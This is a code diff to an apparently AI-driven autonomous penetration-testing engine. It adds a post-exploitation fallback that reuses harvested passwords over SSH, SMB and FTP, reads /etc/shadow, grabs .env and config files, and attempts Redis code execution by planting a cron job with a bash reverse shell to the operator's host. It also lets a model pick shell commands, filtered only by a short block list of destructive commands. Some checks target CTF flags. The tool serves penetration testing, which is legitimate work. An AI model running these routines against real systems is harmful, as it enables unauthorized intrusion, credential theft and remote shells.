@@ -272,17 +272,16 @@ def _scheduler_tick():
                 sched_id, proj_id, tgt, cron_expr, cfg_str = row
                 cfg = json.loads(cfg_str or "{}")
                 try:
-                    from __main__ import ClaudePentestEngine, _active_engines  # noqa: F401
-                except Exception:
-                    pass
-                try:
+                    # BUG4 FIX: no 'from __main__ import' — ClaudePentestEngine and
+                    # AUTOPILOT_ENGINES are already in this module's global scope.
                     eng = ClaudePentestEngine(
                         project_id=proj_id, targets=[tgt],
                         mode=cfg.get("mode", "normal"),
                         lhost=cfg.get("lhost", ""),
                         lport=cfg.get("lport", "4444"),
                     )
-                    _active_engines[proj_id] = eng
+                    # BUG3 FIX: store in AUTOPILOT_ENGINES (the single authoritative dict)
+                    AUTOPILOT_ENGINES[proj_id] = eng
                     eng.start()
                     nxt = _next_cron_run(cron_expr)
                     with sqlite3.connect(str(SCHEDULER_DB)) as conn:
@@ -7189,18 +7188,32 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             job["proc"] = proc
             job["pid"] = proc.pid
             if timeout:
-                def _kill():
+                def _kill(p=proc, n=name, t=timeout):
+                    # BUG5 FIX: SIGTERM first, then SIGKILL after 3s for stubborn processes
+                    # (nmap --min-rate, msfconsole, hydra often ignore SIGTERM)
                     try:
-                        proc.terminate()
+                        p.terminate()
                     except Exception:
                         pass
-                    self._log(f"TIMEOUT {name} (>{timeout}s)")
+                    time.sleep(3)
+                    try:
+                        if p.poll() is None:
+                            p.kill()
+                    except Exception:
+                        pass
+                    self._log(f"TIMEOUT+KILLED {n} (>{t}s)")
                 _kill_timer = threading.Timer(timeout, _kill)
                 _kill_timer.start()
             for line in proc.stdout:
                 job["output"].append(line.rstrip("\n"))
                 if not self._running:
-                    proc.terminate()
+                    try:
+                        proc.terminate()
+                        time.sleep(1)
+                        if proc.poll() is None:
+                            proc.kill()
+                    except Exception:
+                        pass
                     break
             proc.wait()
             job["return_code"] = proc.returncode
@@ -7286,13 +7299,9 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 _auto_mitre_tag(f)
                 _auto_remediation(f)
                 _attach_msf_command(f, target, vars_dict)
-                # T3 H3: compliance auto-tagging
-                engine_ref = next(
-                    (e for e in _active_engines.values() if getattr(e, 'project_id', None) == project_id),
-                    None
-                )
-                if engine_ref and hasattr(engine_ref, '_auto_compliance_tag'):
-                    engine_ref._auto_compliance_tag(f)
+                # T3 H3: compliance auto-tagging — use self directly (avoids cross-dict lookup bug)
+                if hasattr(self, '_auto_compliance_tag'):
+                    self._auto_compliance_tag(f)
                 project.setdefault("findings", []).append(f)
                 existing.add(title)
                 added += 1
@@ -13505,6 +13514,233 @@ http:
                 write_project(proj)
         self._log(f"[S5-ASS] Score: {raw:.1f}/100 (grade {surface['grade']}) | crits={sev_breakdown.get('critical',0)}")
 
+    # ──────────────────────────────────────────────────────────────────────
+    # BUG7 FIX: Deterministic post-exploitation fallback (no API key needed)
+    # Runs when ANTHROPIC_API_KEY is absent or Claude call fails.
+    # Covers: privilege escalation, credential reuse, flag hunting.
+    # ──────────────────────────────────────────────────────────────────────
+    def _phase5_no_api_fallback(self, target, open_ports, accumulated_output):
+        self._log("[Fallback] ══ Iniciando post-explotación determinística (sin API key) ══")
+
+        # ── 1. Collect all verified credentials found so far ─────────────
+        proj = read_project(self.project_id)
+        findings_list = proj.get("findings", []) if proj else []
+        cred_pairs: list[tuple[str, str]] = []
+        import re as _re
+        for f in findings_list:
+            raw_desc = f.get("description", "") + " " + f.get("title", "")
+            # Pattern: user:pass, user / pass, Username: X Password: Y
+            for m in _re.finditer(
+                r"(?:user(?:name)?[:\s]+)(\S+)(?:[:\s/]+)(?:pass(?:word)?[:\s]+)?(\S+)",
+                raw_desc, _re.IGNORECASE
+            ):
+                u, p = m.group(1).strip(":"), m.group(2).strip(":")
+                if u and p and len(p) < 64:
+                    cred_pairs.append((u, p))
+        # De-dup
+        cred_pairs = list(dict.fromkeys(cred_pairs))
+        self._log(f"[Fallback] Credenciales recopiladas: {len(cred_pairs)}")
+
+        port_set = set(open_ports)
+
+        # ── 2. Try creds on discovered services ──────────────────────────
+        for user, passwd in cred_pairs[:10]:   # cap at 10 pairs to avoid huge runtime
+            # SSH
+            if 22 in port_set:
+                out, _ = self._run_cmd(
+                    "fallback-ssh-login",
+                    f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
+                    f"-o ConnectTimeout=8 -o BatchMode=no {user}@{target} "
+                    f"'id; uname -a; cat /etc/passwd | head -5' 2>&1",
+                    timeout=20
+                )
+                if out and any(x in out for x in ["uid=", "root", "Linux", "Darwin"]):
+                    self._log(f"[Fallback] ✔ SSH login con {user}:{passwd}")
+                    self._save_findings([{
+                        "title": f"Valid SSH Credentials: {user}",
+                        "severity": "critical",
+                        "description": f"SSH login successful with {user}:{passwd}. Output: {out[:400]}",
+                        "host": target, "port": 22,
+                    }])
+                    accumulated_output.append(f"SSH shell as {user}: {out[:800]}")
+                    # Post-exploit on the same creds
+                    for cmd in [
+                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'sudo -l 2>/dev/null'",
+                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'find / -perm -4000 -type f 2>/dev/null | head -20'",
+                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null'",
+                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'cat /etc/shadow 2>/dev/null | head -5'",
+                        f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no {user}@{target} 'find / -name user.txt -o -name root.txt -o -name flag.txt 2>/dev/null | xargs cat 2>/dev/null'",
+                    ]:
+                        pout, _ = self._run_cmd("fallback-post-ssh", cmd, timeout=25)
+                        if pout and pout.strip():
+                            accumulated_output.append(pout[:600])
+                            self._log(f"[Fallback] Post-exploit SSH: {pout[:120]}")
+                            if "NOPASSWD" in pout:
+                                self._save_findings([{
+                                    "title": "Sudo NOPASSWD — Privilege Escalation Vector",
+                                    "severity": "critical",
+                                    "description": f"User {user} can run sudo without password:\n{pout[:500]}",
+                                    "host": target, "port": 22,
+                                }])
+                            if any(x in pout for x in ["HTB{", "THM{", "FLAG{", "flag{"]):
+                                self._save_findings([{
+                                    "title": "CTF Flag Captured",
+                                    "severity": "critical",
+                                    "description": f"Flag found: {pout[:300]}",
+                                    "host": target, "port": 22,
+                                }])
+
+            # SMB (445)
+            if 445 in port_set:
+                out, _ = self._run_cmd(
+                    "fallback-smb-login",
+                    f"crackmapexec smb {target} -u '{user}' -p '{passwd}' --shares 2>&1",
+                    timeout=30
+                )
+                if out and "[+]" in out:
+                    self._log(f"[Fallback] ✔ SMB login con {user}:{passwd}")
+                    self._save_findings([{
+                        "title": f"Valid SMB Credentials: {user}",
+                        "severity": "high",
+                        "description": f"SMB login successful: {out[:400]}",
+                        "host": target, "port": 445,
+                    }])
+                    accumulated_output.append(f"SMB as {user}: {out[:600]}")
+
+            # FTP (21)
+            if 21 in port_set:
+                out, _ = self._run_cmd(
+                    "fallback-ftp-login",
+                    f"curl -s --connect-timeout 8 ftp://{user}:{passwd}@{target}/ 2>&1",
+                    timeout=20
+                )
+                if out and ("ftp" in out.lower() or "/" in out):
+                    self._log(f"[Fallback] ✔ FTP login con {user}:{passwd}")
+                    self._save_findings([{
+                        "title": f"Valid FTP Credentials: {user}",
+                        "severity": "high",
+                        "description": f"FTP login successful: {out[:400]}",
+                        "host": target, "port": 21,
+                    }])
+
+        # ── 3. Anonymous / unauthenticated checks ────────────────────────
+        # FTP anonymous
+        if 21 in port_set:
+            out, _ = self._run_cmd(
+                "fallback-ftp-anon",
+                f"curl -s --connect-timeout 8 ftp://anonymous:anonymous@{target}/ 2>&1",
+                timeout=20
+            )
+            if out and "ftp" in out.lower():
+                self._save_findings([{
+                    "title": "FTP Anonymous Login",
+                    "severity": "high",
+                    "description": f"FTP anonymous access confirmed. Listing: {out[:400]}",
+                    "host": target, "port": 21,
+                }])
+                self._log("[Fallback] ✔ FTP anónimo accesible")
+                # Try to grab sensitive files
+                for fname in ["/etc/passwd", "/.bash_history", "/flag.txt", "/user.txt"]:
+                    fout, _ = self._run_cmd(
+                        "fallback-ftp-get",
+                        f"curl -s --connect-timeout 8 ftp://anonymous:anonymous@{target}{fname} 2>&1",
+                        timeout=15
+                    )
+                    if fout and len(fout) > 10 and "failed" not in fout.lower():
+                        self._save_findings([{
+                            "title": f"FTP Sensitive File Exposed: {fname}",
+                            "severity": "critical",
+                            "description": f"Content: {fout[:500]}",
+                            "host": target, "port": 21,
+                        }])
+
+        # Redis unauthenticated
+        if 6379 in port_set:
+            out, _ = self._run_cmd(
+                "fallback-redis-info",
+                f"redis-cli -h {target} -p 6379 INFO server 2>&1",
+                timeout=15
+            )
+            if out and "redis_version" in out:
+                self._save_findings([{
+                    "title": "Redis Unauthenticated Access",
+                    "severity": "critical",
+                    "description": f"Redis accessible without authentication. INFO: {out[:400]}",
+                    "host": target, "port": 6379,
+                }])
+                self._log("[Fallback] ✔ Redis sin autenticación")
+                # Attempt RCE via cron
+                rce_cmds = [
+                    f"redis-cli -h {target} SET fallback_test '\\n\\n*/1 * * * * root bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\\n\\n'",
+                    f"redis-cli -h {target} CONFIG SET dir /etc/cron.d",
+                    f"redis-cli -h {target} CONFIG SET dbfilename pentsuite_pwn",
+                    f"redis-cli -h {target} SAVE",
+                ]
+                for rc in rce_cmds:
+                    self._run_cmd("fallback-redis-rce", rc, timeout=10)
+                self._log("[Fallback] Redis RCE via cron intentado")
+
+        # MySQL empty password
+        if 3306 in port_set:
+            out, _ = self._run_cmd(
+                "fallback-mysql-empty",
+                f"mysql -h {target} -u root --connect-timeout=8 -e 'SHOW DATABASES;' 2>&1",
+                timeout=20
+            )
+            if out and "Database" in out and "error" not in out.lower():
+                self._save_findings([{
+                    "title": "MySQL Empty Root Password",
+                    "severity": "critical",
+                    "description": f"MySQL root login without password succeeded. DBs: {out[:400]}",
+                    "host": target, "port": 3306,
+                }])
+                self._log("[Fallback] ✔ MySQL root sin contraseña")
+
+        # ── 4. SUID / privesc quick scan via any existing shell ───────────
+        # If we already have meterpreter/shell output in accumulated_output, grep for privesc hints
+        full_context = "\n".join(str(x) for x in accumulated_output)
+        if _re.search(r"uid=\d+|root@|meterpreter", full_context, _re.IGNORECASE):
+            self._log("[Fallback] Shell activa detectada en contexto acumulado — buscando privesc")
+            privesc_hints = []
+            if "NOPASSWD" in full_context:
+                privesc_hints.append("sudo NOPASSWD")
+            for suid in ["/usr/bin/find", "/usr/bin/python", "/usr/bin/perl", "/usr/bin/nmap",
+                         "/bin/bash", "/usr/bin/vim", "/usr/bin/less", "/usr/bin/more"]:
+                if suid in full_context:
+                    privesc_hints.append(f"SUID binary: {suid}")
+            if privesc_hints:
+                self._save_findings([{
+                    "title": "Privilege Escalation Vectors Detected",
+                    "severity": "critical",
+                    "description": "Privesc hints found in post-exploit output:\n" + "\n".join(privesc_hints),
+                    "host": target,
+                }])
+
+        # ── 5. Flag hunting via web paths (if HTTP open) ─────────────────
+        for http_port in [p for p in open_ports if p in (80, 443, 8080, 8443, 8000, 8888)]:
+            scheme = "https" if http_port in (443, 8443) else "http"
+            for path in ["/flag.txt", "/user.txt", "/root.txt", "/.git/HEAD",
+                         "/.env", "/config.php", "/wp-config.php", "/backup.zip"]:
+                fout, _ = self._run_cmd(
+                    "fallback-http-file",
+                    f"curl -sk --connect-timeout 6 -o - {scheme}://{target}:{http_port}{path} 2>&1",
+                    timeout=15
+                )
+                if fout and len(fout) > 4 and not any(x in fout for x in ["404", "Not Found", "curl: "]):
+                    self._save_findings([{
+                        "title": f"Sensitive File Exposed via HTTP: {path}",
+                        "severity": "critical" if any(k in path for k in ["flag", "user", "root", ".env", "config"]) else "high",
+                        "description": f"File accessible at {scheme}://{target}:{http_port}{path}\nContent: {fout[:400]}",
+                        "host": target, "port": http_port,
+                    }])
+                    self._log(f"[Fallback] ✔ Archivo sensible expuesto: {path}")
+
+        # ── 6. Run vuln chain one final time with full context ────────────
+        self._log("[Fallback] Ejecutando vuln-chain final con contexto completo...")
+        self._vuln_chain_engine(target, open_ports, accumulated_output)
+
+        self._log("[Fallback] ══ Post-explotación determinística completada ══")
+
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
         context_parts = [
@@ -13534,16 +13770,24 @@ http:
         _osint_future = None
         _udp_exec = _cf0.ThreadPoolExecutor(max_workers=2, thread_name_prefix="bg")
         _udp_future = _udp_exec.submit(self._udp_snmp_scan, target, accumulated_output)
-        _osint_future = _udp_exec.submit(self._osint_recon, target, open_ports, accumulated_output)
+        # open_ports not yet defined — _osint_recon uses [] and will discover ports itself via DNS/cert/shodan
+        _osint_future = _udp_exec.submit(self._osint_recon, target, [], accumulated_output)
 
         # ── FASE 2: Deep scan con versiones + vuln scripts ────────────────
         self._log(f"[Claude] Fase 2/5: Scan profundo con vuln scripts")
+        # BUG6 FIX: original filter had smb-vuln-ms17-010, ftp-vsftpd-backdoor, mysql-empty-password
+        # etc. in the NOT list → EternalBlue, vsftpd backdoor, MySQL empty root NEVER detected.
+        # Fix: NOT list contains ONLY pure-DoS + noisy info scripts.
+        # Critical vuln scripts are force-added via second --script argument.
         deep_out, _ = self._run_cmd(
             "nmap-deep-vuln",
             f"nmap -sV -sC --open -T4 -p {port_str} "
-            f"--script='vuln and not dos,banner,smtp-commands,ssh-hostkey,ftp-anon,ftp-syst,"
-            f"http-headers,smb-security-mode,smb-vuln-ms17-010,smb-vuln-ms08-067,smb-double-pulsar-backdoor,"
-            f"ftp-vsftpd-backdoor,irc-unrealircd-backdoor,mysql-empty-password,redis-info' "
+            # Run all 'vuln' category scripts EXCEPT pure-DoS and noisy info ones
+            f"--script='vuln and not (dos or smb-flood or http-slowloris or http-form-fuzzer "
+            f"or banner or smtp-commands or ssh-hostkey or ftp-syst or http-headers or smb-security-mode)' "
+            # Force-add the most critical individual scripts (in case they're not in 'vuln' category on this nmap build)
+            f"--script=ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,smb-vuln-ms08-067,"
+            f"smb-double-pulsar-backdoor,irc-unrealircd-backdoor,mysql-empty-password,redis-info "
             f"--script-timeout 45s {target} 2>/dev/null",
             target, timeout=420,
         )
@@ -13669,68 +13913,75 @@ http:
         self._log(f"[Claude] Fase 5/5: Análisis IA y explotación avanzada")
         all_output = "\n\n".join(accumulated_output)
 
-        for step in range(self.MAX_STEPS):
-            if not self._running:
-                break
+        # BUG7 FIX: if no API key, run deterministic post-exploit fallback instead of silently doing nothing
+        if not os.environ.get("ANTHROPIC_API_KEY", "").strip():
+            self._log("[Claude] Sin API key — ejecutando fallback post-exploit determinístico")
+            self._phase5_no_api_fallback(target, open_ports, accumulated_output)
+        else:
+            for step in range(self.MAX_STEPS):
+                if not self._running:
+                    break
 
-            context_summary = "\n".join(context_parts[-35:])
-            # Pass the most recent 7000 chars of cumulative output to Claude
-            decision = self._ask_claude(all_output[-7000:], target, context_summary)
+                context_summary = "\n".join(context_parts[-35:])
+                decision = self._ask_claude(all_output[-7000:], target, context_summary)
 
-            if not decision:
-                self._log(f"[Claude] Sin respuesta IA en paso {step + 1} — fin del loop")
-                break
+                if not decision:
+                    self._log(f"[Claude] Sin respuesta IA en paso {step + 1} — reintentando con fallback")
+                    # BUG7 FIX: one API failure → fallback, not silent abort
+                    self._phase5_no_api_fallback(target, open_ports, accumulated_output)
+                    break
 
-            findings = decision.get("findings", [])
-            if findings:
-                self._save_findings(findings, target)
-                for f in findings:
-                    context_parts.append(
-                        f"FINDING: {f.get('severity','?').upper()} — {f.get('title','?')}"
-                    )
+                findings = decision.get("findings", [])
+                if findings:
+                    self._save_findings(findings, target)
+                    for f in findings:
+                        context_parts.append(
+                            f"FINDING: {f.get('severity','?').upper()} — {f.get('title','?')}"
+                        )
 
-            next_action = decision.get("next_action", {})
-            action_type = next_action.get("type", "done")
-            reason = next_action.get("reason", "")
-            self._log(f"[Claude] AI Paso {step + 1}: {action_type} — {reason[:120]}")
+                next_action = decision.get("next_action", {})
+                action_type = next_action.get("type", "done")
+                reason = next_action.get("reason", "")
+                self._log(f"[Claude] AI Paso {step + 1}: {action_type} — {reason[:120]}")
 
-            if action_type == "done":
-                self._log(f"[Claude] ✓ Pentest completado en {target} ({step + 1} pasos IA)")
-                break
+                if action_type == "done":
+                    self._log(f"[Claude] Pentest completado en {target} ({step + 1} pasos IA)")
+                    break
 
-            command = next_action.get("command", "").strip()
-            if not command:
-                self._log(f"[Claude] Sin comando en paso {step + 1}")
-                break
+                command = next_action.get("command", "").strip()
+                if not command:
+                    self._log(f"[Claude] Sin comando en paso {step + 1} — continuando")
+                    continue  # BUG8 FIX: was 'break' — empty command should skip, not abort loop
 
-            # Safety: block destructive commands
-            if any(bad in command for bad in ["rm -rf /", "mkfs ", "dd if=/dev/zero", "> /dev/sda"]):
-                self._log(f"[Claude] BLOQUEADO: {command[:80]}")
-                break
+                # Safety: block destructive commands
+                BLOCKED = ["rm -rf /", "mkfs ", "dd if=/dev/zero", "> /dev/sda",
+                           ":(){ :|:& };:", "chmod -R 777 /", "chown -R root /"]
+                if any(bad in command for bad in BLOCKED):
+                    self._log(f"[Claude] BLOQUEADO: {command[:80]}")
+                    continue  # BUG8 FIX: was 'break' — one blocked cmd shouldn't stop the loop
 
-            step_name = next_action.get("tool", "other") + f"-ai{step + 1}"
-            is_heavy = any(t in command for t in
-                           ["msfconsole", "hydra", "hashcat", "john", "sqlmap", "crackmapexec"])
-            timeout = 600 if is_heavy else 300
+                step_name = next_action.get("tool", "other") + f"-ai{step + 1}"
+                is_heavy = any(t in command for t in
+                               ["msfconsole", "hydra", "hashcat", "john", "sqlmap", "crackmapexec"])
+                timeout = 600 if is_heavy else 300
 
-            self._log(f"[Claude] Ejecutando: {command[:130]}")
-            step_out, _ = self._run_cmd(step_name, command, target, timeout=timeout)
+                self._log(f"[Claude] Ejecutando: {command[:130]}")
+                step_out, _ = self._run_cmd(step_name, command, target, timeout=timeout)
 
-            if any(t in command.lower() for t in ["exploit", "msfconsole", "hydra", "sqlmap"]):
-                self.stats["exploits_run"] += 1
+                if any(t in command.lower() for t in ["exploit", "msfconsole", "hydra", "sqlmap"]):
+                    self.stats["exploits_run"] += 1
 
-            self._capture_evidence(step_out, target, step_name, command)
+                self._capture_evidence(step_out, target, step_name, command)
 
-            # Parse tool output for additional findings
-            tool_hint = next_action.get("tool", "other").lower()
-            step_parsed = _parse_tool_output(tool_hint, step_out, target, step_name)
-            if step_parsed.get("findings"):
-                self._save_findings(step_parsed["findings"], target)
+                tool_hint = next_action.get("tool", "other").lower()
+                step_parsed = _parse_tool_output(tool_hint, step_out, target, step_name)
+                if step_parsed.get("findings"):
+                    self._save_findings(step_parsed["findings"], target)
 
-            all_output += f"\n\n=== AI-{step + 1} [{step_name}] ===\n{step_out[:1200]}"
-            context_parts.append(
-                f"Paso AI-{step + 1} [{step_name}]: {step_out[:500].replace(chr(10), ' | ')}"
-            )
+                all_output += f"\n\n=== AI-{step + 1} [{step_name}] ===\n{step_out[:1200]}"
+                context_parts.append(
+                    f"Paso AI-{step + 1} [{step_name}]: {step_out[:500].replace(chr(10), ' | ')}"
+                )
 
         # ── S4: Replay PoC + S5: Attack Surface Score ─────────────────────────
         self._generate_replay_poc(target, accumulated_output)
@@ -15218,7 +15469,7 @@ def batch_scan():
     def _start(pid, tgt):
         eng = ClaudePentestEngine(project_id=pid, targets=[tgt],
                                   mode=mode, lhost=lhost, lport=lport)
-        _active_engines[pid] = eng
+        AUTOPILOT_ENGINES[pid] = eng  # BUG3 FIX: use single authoritative dict
         eng.start()
 
     import concurrent.futures as _cf_batch
